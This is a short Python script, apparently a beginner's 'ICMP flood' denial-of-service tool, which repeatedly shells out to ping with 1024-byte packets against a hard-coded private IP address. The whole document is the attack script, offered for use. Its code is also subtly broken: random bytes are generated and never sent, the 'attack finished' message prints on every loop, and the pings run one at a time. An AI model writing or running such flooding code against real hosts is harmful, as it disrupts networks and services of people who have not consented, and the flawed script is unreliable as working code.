import os
import random

target_ip = "192.168.1.135"

packet_size = 1024
packet_count = 1000

for _ in range(packet_count):
    packet = os.urandom(packet_size)
    os.system(f"ping -c 1 -s {packet_size} {target_ip} ")

    print("ICMP Flood attack finished!")